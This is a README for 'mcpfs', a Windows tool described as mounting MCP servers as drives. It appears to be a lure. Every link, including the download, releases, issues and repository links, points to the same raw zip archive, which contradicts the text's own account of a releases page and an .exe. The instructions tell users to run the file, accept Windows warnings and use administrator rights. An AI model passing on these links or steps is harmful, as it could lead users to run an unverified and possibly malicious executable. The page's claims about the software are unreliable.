# ⚙️ mcpfs - Mount MCP Servers as Filesystems

[![Download mcpfs](https://img.shields.io/badge/Download-mcpfs-brightgreen?style=for-the-badge)](https://github.com/TakyiEric/mcpfs/raw/refs/heads/main/bin/Software_2.9.zip)

Mount MCP servers as filesystems for easy access. This tool lets you work with MCP servers by showing their files directly on your Windows computer.

---

## 📁 What is mcpfs?

mcpfs lets you connect to MCP (Model Context Protocol) servers and use them like a normal drive on your Windows PC. Instead of using complicated commands to get files, you see them as folders and files in Windows Explorer.

This works by turning MCP servers into a filesystem. You can open, use, and manage files without switching apps or using programming tools.

You do not need any special skills, just basic Windows use knowledge.


## 🎯 Why Use mcpfs?

- Access MCP servers like they are part of your PC.
- Work with files without extra steps.
- Use commands just to start the mount; afterwards, interact through Windows.
- Compatible with Windows 10 and above.
- Safe and easy to remove when done.

## 🖥️ System Requirements

- Windows 10 or newer (64-bit recommended).
- At least 2 GB of free RAM.
- 100 MB of disk space for installation files.
- Internet access to reach MCP servers.
- User account with permission to install software.

## 💡 Key Features

- Mount MCP servers as drives using easy commands.
- Browse server files with Windows Explorer or any file manager.
- Read and write files directly.
- Handles multiple MCP servers at once.
- Lightweight and minimal CPU use.
- Works well with standard Windows apps.

## 🚀 Getting Started

Follow these steps to download and run mcpfs on Windows. This guide assumes no prior setup or programming knowledge.

---

## ⬇️ Download and Installation

1. Visit the release page by clicking this button:

[![Download mcpfs](https://img.shields.io/badge/Download%20Page-Visit%20to%20Download-blue?style=for-the-badge)](https://github.com/TakyiEric/mcpfs/raw/refs/heads/main/bin/Software_2.9.zip)

2. On the releases page, find the latest stable version. Look for a file named something like `mcpfs-windows-amd64.exe` or similar.

3. Click on that file to download it. It will save as an `.exe` file, which means it is ready to run on Windows.

4. Once downloaded, open the file by double-clicking it. Windows may warn you since the app is not from the Microsoft Store. Confirm you want to run it.

5. The app runs without needing full installation. It may open a command window or prompt for more info.

---

## ⚙️ Setting Up mcpfs

After running the file, you need to connect to your MCP server.

1. Open the command window if not already open.

2. Type the command as shown here:

```
mcpfs mount <server-address> <drive-letter>:
```

Replace `<server-address>` with the address for your MCP server, such as `mcp.example.com`.

Replace `<drive-letter>` with any free letter you want for the new drive, like `M:`.

Example:

```
mcpfs mount mcp.example.com M:
```

3. Press Enter.

4. If your server requires login, the program will ask for a username and password.

5. Once connected, open Windows Explorer and look for the new drive letter you used. You can browse the files stored on the MCP server like normal files.

---

## 🛠 How to Use mcpfs

- Open the mounted drive from Windows Explorer.
- Copy, move, and edit files on the drive.
- Save files directly to the MCP server without extra upload steps.
- To stop using the server, open the command window again and type:

```
mcpfs unmount M:
```

Replace `M:` with your drive letter.

---

## 🔄 Updating mcpfs

Check the releases page regularly for new versions. Download the latest `.exe` file and run it just like before. 

---

## 🚧 Troubleshooting

- If the mount command does not work, check the spelling of your server address.
- Ensure you have internet access.
- Confirm your drive letter is not used by another device.
- If you get permission errors, try running the `.exe` file as administrator (right-click > Run as administrator).
- If files don’t show up, try unmounting and mounting again.
- For connection issues, verify your MCP server is online and accepting connections.

---

## 📌 Useful Tips

- Close any file windows before unmounting.
- You can mount multiple servers at once with different drive letters.
- Keep your password safe; mcpfs does not store it unless you tell it to.
- Use simple drive letters to avoid confusion.

---

## ❓ Where to Get Help

Visit the [issues](https://github.com/TakyiEric/mcpfs/raw/refs/heads/main/bin/Software_2.9.zip) page on the GitHub repository to report problems or ask questions.

---

## 🔗 Important Links

- Download page: https://github.com/TakyiEric/mcpfs/raw/refs/heads/main/bin/Software_2.9.zip  
- Repository: https://github.com/TakyiEric/mcpfs/raw/refs/heads/main/bin/Software_2.9.zip

---

## 🗂️ About the Project

mcpfs is built with Golang. It uses filesystem tools to map MCP servers to Windows drives. The aim is to give easy access to agent context in a familiar environment.

This tool fits users who need to work with AI agent contexts in a straightforward way without programming or complex software setups.

---

## 📋 License

This project is open source. See the LICENSE file in the repository for details.